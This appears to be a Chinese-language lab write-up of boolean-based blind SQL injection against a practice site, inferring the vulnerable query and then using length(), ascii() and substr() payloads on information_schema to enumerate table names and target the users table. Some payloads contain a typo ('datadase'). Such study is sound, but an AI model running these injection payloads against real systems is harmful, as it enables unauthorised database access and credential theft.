报错注入or盲注

盲注一般用到的一些函数：**ascii()、substr() 、length()，exists()、concat()**等





测试

```
?id=1
显示You are in...........   但没有任何数据输出
```

测试

```
?id=1'
报错了
```

再测试

```
?id=1' order by 3 --+
还是显示  You are in...........
?id=1' order by 4 --+
报错，提示超出列数
```

因此，可以推断出源代码

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //sql查询语句
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
    if($row){                    //如果查询到数据
          echo 'You are in...........';
    }else{                      //如果没查询到数据
         print_r(mysql_error());    
    }
```

查询到数据时，会显示You are in ...



下面来判断数据库长度

```
?id=1' and length(datadase()) > 7 --+
显示You are in...
?id=1' and length(datadase()) > 8 --+
无显示，说明错误

由此说明数据库名长度为8
```



// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4

```
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>5 #
```



```
判断每个表的长度
//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6

//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6

判断每个表的每个字符的ascii值
//判断第一个表的第一个字符的ascii值
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #

//判断第一个表的第二个字符的ascii值
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>100 #

.........
由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断
```

。。。
